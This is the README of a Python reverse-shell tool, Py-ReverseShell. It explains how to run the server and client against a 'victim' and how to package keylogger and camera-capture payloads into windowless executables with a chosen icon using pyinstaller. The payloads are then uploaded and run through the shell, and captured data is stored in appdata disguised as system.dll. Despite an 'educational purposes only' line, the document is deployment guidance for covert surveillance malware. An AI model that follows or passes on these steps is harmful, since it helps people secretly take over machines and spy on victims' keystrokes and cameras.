# Py-ReverseShell
A Reverse Shell, also known as a remote shell or "connect-back shell" is process used to gain access a victim's remote system by initiating a shell session. The Py-ReverseShell is a shell code written in python that is able to establish a remote connection and upload KeyLoggers and Camera Monitoring onto the Victims systems. Everything Above is for educational purposes only.

# How To Install
- git clone https://github.com/CuriousAvenger/Py-ReverseShell
- python3 RS-Server.py or RS-Client.py

# How To Use
- A host is required to run `RS-Server.py`, while a victim connects
- Change the `IP` address in `RS-Client.py` to the server's address
- Use `ipconfig` or `ifconfig` to get the IP address of host machine.
- After client connect, type help to see available commands

# Additional Payloads
- Convert `CamCapture.py` and `Keylogger.py` into exe files using below code
- `pyinstaller --onefile --noconsole -i <icon> <filename> -n <output.exe>`
- Upload & run these payloads using `upload` & `start` features in shell
- All required information will be stored in appdata as `system.dll`
